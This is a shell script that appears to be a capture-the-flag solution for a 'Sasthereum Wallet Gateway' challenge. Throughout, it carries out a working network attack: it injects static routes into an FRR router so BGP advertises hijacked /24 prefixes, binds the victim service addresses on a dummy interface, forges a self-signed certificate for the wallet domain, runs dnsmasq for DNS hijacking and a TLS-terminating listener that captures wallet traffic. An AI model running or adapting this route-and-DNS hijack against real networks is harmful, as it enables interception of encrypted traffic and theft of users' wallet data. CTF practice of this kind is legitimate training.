#!/bin/sh
# End-to-end exploit for SAS CTF 2026 — Sasthereum Wallet Gateway.
#
# Run the [router] section on the FRR router (player@router), and the
# [tools] section on the tools server (player@player-tools).
#
# Prereqs in the challenge environment:
#   - player is in `frrvty` group on the router (vtysh access)
#   - player has passwordless sudo on the tools server
#   - FRR already has `network 10.0.{1,2,5}.0/24` configured but inactive
#     because no kernel route matches the hijack /24s.

############################## [router] ##############################
# Originate the hijacked /24s into BGP by pointing them at the tools box.
vtysh \
  -c "configure terminal" \
  -c "ip route 10.0.1.0/24 10.0.5.100" \
  -c "ip route 10.0.2.0/24 10.0.5.100" \
  -c "end" \
  -c "write memory"

vtysh -c "show ip bgp"
vtysh -c "show ip bgp neighbors 10.100.45.1 advertised-routes"

############################## [tools] ##############################
# Land the hijacked service IPs on a dummy interface.
sudo ip link add dummy0 type dummy
sudo ip link set dummy0 up
sudo ip addr add 10.0.1.53/32 dev dummy0
sudo ip addr add 10.0.2.80/32 dev dummy0

# Generate a self-signed cert for the wallet.
cd /tmp
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 1 \
  -subj "/CN=cryptowallet.ctf" \
  -addext "subjectAltName=DNS:cryptowallet.ctf,DNS:*.cryptowallet.ctf,IP:10.0.2.80"

# DNS hijack: cryptowallet.ctf -> our wallet IP.
sudo dnsmasq -C ./dnsmasq.conf -d &

# Capture wallet traffic with TLS termination.
sudo python3 ./tls_listener.py &

# Wait for the next client poll (~30s) and read the flag.
sleep 60
sudo cat /tmp/wallet_tls.log
